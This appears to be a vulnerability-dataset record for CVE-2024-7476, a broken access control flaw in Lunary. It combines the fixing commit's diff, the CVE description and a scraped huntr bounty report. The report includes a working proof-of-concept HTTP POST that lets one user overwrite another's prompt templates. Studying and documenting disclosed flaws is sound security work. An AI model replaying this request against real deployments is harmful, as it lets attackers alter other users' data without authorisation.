{
    "CVE-2024-7476": {
        "published_date": "2025-03-20T10:09:59.839Z",
        "patch_commits": [
            {
                "url": "https://github.com/lunary-ai/lunary/commit/8f563c77d8614a72980113f530c7a9ec15a5f8d5",
                "content": "fix: vulnerabilities (#468)\n\nFilename: packages/backend/src/api/v1/datasets/index.ts:\n```\n@@ -107,8 +107,15 @@\ndatasets.patch(\n     }\n \n     const [dataset] = await sql`\n-    update dataset set slug = ${slug} where id = ${id} and project_id = ${projectId} returning *\n-  `\n+      update \n+        dataset \n+      set \n+        slug = ${slug} \n+      where \n+      id = ${id} \n+      and project_id = ${projectId} \n+      returning *\n+    `\n \n     ctx.body = dataset\n   },\n\n@@ -218,10 +225,25 @@\ndatasets.patch(\n   checkAccess(\"datasets\", \"update\"),\n   async (ctx: Context) => {\n     const { id } = ctx.params\n+    const { projectId } = ctx.state\n     const { messages } = ctx.request.body as {\n       messages: string\n     }\n \n+    const [dataset] = await sql`\n+      select \n+        d.id \n+      from \n+        dataset_prompt dp\n+        left join dataset d on dp.dataset_id = d.id\n+      where\n+        d.project_id = ${projectId}\n+    `\n+\n+    if (!dataset) {\n+      ctx.throw(403, \"Unauthorized\")\n+    }\n+\n     const [prompt] =\n       await sql`update dataset_prompt set messages = ${messages} where id = ${id} returning *`\n```\n\nFilename: packages/backend/src/api/v1/external-users.ts:\n```\n@@ -141,17 +141,32 @@\nusers.get(\"/runs/usage\", checkAccess(\"users\", \"read\"), async (ctx) => {\n \n users.get(\"/:id\", checkAccess(\"users\", \"read\"), async (ctx: Context) => {\n   const { id } = ctx.params\n+  const { projectId } = ctx.state\n+\n   const [row] = await sql`\n-    select * from external_user where id = ${id} limit 1\n+    select \n+      * \n+    from \n+      external_user \n+    where \n+      id = ${id} \n+      and project_id = ${projectId}\n   `\n \n   ctx.body = row\n })\n \n users.delete(\"/:id\", checkAccess(\"users\", \"delete\"), async (ctx: Context) => {\n   const { id } = ctx.params\n+  const { projectId } = ctx.state\n \n-  await sql`delete from external_user where id = ${id}`\n+  await sql`\n+    delete \n+    from external_user \n+    where \n+      id = ${id}\n+      and project_id = ${projectId}\n+    `\n \n   ctx.status = 204\n })\n```\n\nFilename: packages/backend/src/api/v1/templates.ts:\n```\n@@ -4,6 +4,7 @@\nimport { clearUndefined } from \"@/src/utils/ingest\"\n import Context from \"@/src/utils/koa\"\n import { unCamelObject } from \"@/src/utils/misc\"\n import Router from \"koa-router\"\n+import { z } from \"zod\"\n \n const templates = new Router({\n   prefix: \"/templates\",\n\n@@ -167,26 +168,44 @@\ntemplates.post(\n   \"/:id/versions\",\n   checkAccess(\"prompts\", \"update\"),\n   async (ctx: Context) => {\n-    const { content, extra, testValues, isDraft, notes } = ctx.request.body as {\n-      content: any[]\n-      extra: any\n-      testValues: any\n-      isDraft: boolean\n-      notes: string\n+    const paramsSchema = z.object({\n+      id: z.coerce.number(),\n+    })\n+    const bodySchema = z.object({\n+      content: z.array(z.any()),\n+      extra: z.any(),\n+      testValues: z.any(),\n+      isDraft: z.boolean(),\n+      notes: z.string().optional().nullable(),\n+    })\n+\n+    const { projectId } = ctx.state\n+    const { content, extra, testValues, isDraft, notes } = bodySchema.parse(\n+      ctx.request.body,\n+    )\n+    const { id: templateId } = paramsSchema.parse(ctx.params)\n+\n+    const [template] =\n+      await sql`select id from template where id = ${templateId} and project_id = ${projectId}\n+    `\n+\n+    if (!template) {\n+      ctx.throw(403, \"Unauthorized\")\n     }\n \n     const [templateVersion] = await sql`\n-    insert into template_version ${sql(\n-      clearUndefined({\n-        templateId: ctx.params.id,\n-        content: sql.json(content),\n-        extra: sql.json(unCamelObject(extra)),\n-        test_values: sql.json(testValues),\n-        isDraft,\n-        notes,\n-      }),\n-    )} returning *\n-  `\n+      insert into template_version ${sql(\n+        clearUndefined({\n+          templateId: ctx.params.id,\n+          content: sql.json(content),\n+          extra: sql.json(unCamelObject(extra)),\n+          test_values: sql.json(testValues),\n+          isDraft,\n+          notes,\n+        }),\n+      )} \n+      returning *\n+    `\n \n     ctx.body = templateVersion\n   },\n```"
            }
        ],
        "sw_version": "v1.4.3-alpha.2",
        "sw_version_wget": "https://github.com/lunary-ai/lunary/archive/refs/tags/v1.4.3-alpha.2.zip",
        "description": "A broken access control vulnerability exists in lunary-ai/lunary versions 1.2.7 through 1.4.2. The vulnerability allows an authenticated attacker to modify any user's templates by sending a crafted HTTP POST request to the /v1/templates/{id}/versions endpoint. This issue is resolved in version 1.4.3.",
        "sec_adv": [
            {
                "url": "https://huntr.com/bounties/183761f7-d411-4332-af86-2ccfbcc5bd9f",
                "content": "Bounties\nPartners\nCommunity\nInfo\nSUBMIT REPORT\n[reopen]Broken Access Control in \"POST /v1/templates/{id}/versions\" in lunary-ai/lunary\nValid\nReported on Apr 11th 2024\nDescription\nI've found broken another access control vulnerability in lunary. It allows me to change any user's templates.\nProof of Concept\nMy self-host is 11.162.171.238:3000.\nStep\n1.Login user 1 ----- victim.\n2.Log in to user2-------attacker and grab this http package.\nPOST /v1/templates/4/versions?projectId=2b4e3438-16f9-4a59-b319-cb21e847fc58 HTTP/1.1\nHost: 11.162.171.238:3000\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nReferer: http://11.162.171.238:9600/login\nOrigin: http://11.162.171.238:9600\nDNT: 1\nAuthorization: attacker jwt\nSec-GPC: 1\nConnection: close\nContent-Type: application/json\nContent-Length: 46\n\n{\"testValues\":{},\"content\":[{\"role\":\"system\",\"content\":\"You are an helpful assistant.\"},{\"role\":\"user\",\"content\":\"Hi!\"},{\"role\":\"user\",\"content\":\"123\\n\"},{\"role\":\"user\",\"content\":\"456\"},{\"role\":\"user\",\"content\":\"789\"},{\"content\":\"user2 test code\",\"role\":\"user\"}],\"extra\":{\"model\":\"gpt-4-turbo-preview\",\"max_tokens\":1000,\"temperature\":1},\"isDraft\":true}\n3.Modify the victim's template id.\n4.User1’s data has been modified.\nImpact\nModify any user's data.\nWe are processing your report and will contact thelunary-ai/lunary team within 24 hours.a year ago\nhuntr-helpermodified the Severity from Critical (9.1) to Medium (6.5)a year ago\nWe have contacted a member of thelunary-ai/lunary team and are waiting to hear backa year ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nhuntr-helperhas marked this vulnerability as a duplicate of 68232d83-d4f8-4a15-8b09-db6f1dfee6aba year ago\nThe disclosure bounty has been dropped\nThe fix bounty has been dropped\nThe researcher's credibility has increased: +7\nhuntr-helper\ncommenteda year ago\nAdmin\nThis report was closed because it was determined to be a duplicate of a report submitted on April, 10 2024\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nhuntr-helperhas marked this vulnerability as a duplicate of 68232d83-d4f8-4a15-8b09-db6f1dfee6aba year ago\nThe disclosure bounty has been dropped\nThe fix bounty has been dropped\nThe researcher's credibility has increased: +7\nhuntr-helper\ncommenteda year ago\nAdmin\nThis report was closed because it was determined to be a duplicate of a report submitted on April, 10 2024\nWe have sent a warning to the lunary-ai/lunary team to inform them that this report will be published in 48 hoursa year ago\nThis vulnerability has now been publisheda year ago\nA huntr admin reset this report to a pending state.a year ago\nA huntr admin reset this report to a pending state.a year ago\nMarcellomodified the Severity from Medium (6.5) to Medium (4.3)10 months ago\nThe researcher has received a minor penalty to their credibility for miscalculating the severity: -1\nHugues Chocart validated this vulnerability9 months ago\nt1m0n0has been awarded the disclosure bounty\nThe fix bounty is now up for grabs\nThe researcher's credibility has increased: +7\nCVE-2024-7476assigned to this report.9 months ago\nHugues Chocartmarked this as fixedin 1.4.3with commit8f563c9 months ago\nHugues Chocarthas been awarded the fix bounty\nHugues Chocart gave praise9 months ago\nThanks\nThe researcher's credibility has slightly increased as a result of the maintainer's thanks: +1\nWe have notified the lunary-ai/lunary maintainers about this report in their weekly follow-up6 months ago\nCVE-2024-7476has now been published2 months ago\nSign in to join this conversation\nCVE\nCVE-2024-7476\n(Published)\nVulnerability Type\nCWE-284: Improper Access Control\nSeverity\nMedium (4.3)\nAttack vector\nNetwork\nAttack complexity\nLow\nPrivileges required\nLow\nUser interaction\nNone\nScope\nUnchanged\nConfidentiality\nNone\nIntegrity\nLow\nAvailability\nNone\nOpen in visual CVSS calculator\nRegistry\nPackagist\nAffected Version\n1.2.7\nVisibility\nPublic\nStatus\nFixed\nDisclosure Bounty\n$75\nFix Bounty\n$18.75\nFound by\nFixed by\nSupported by Protect AI and leading the way to MLSecOps and greater AI security.\n© 2024\nPrivacy Policy\nTerms of Service\nCode of Conduct\nCookie Preferences\nContact Us",
                "effective": true,
                "effective_reason": "The description includes detailed reproduction steps, including specific HTTP requests."
            }
        ],
        "cwe": [
            {
                "id": "CWE-284",
                "value": "CWE-284 Improper Access Control"
            }
        ]
    }
}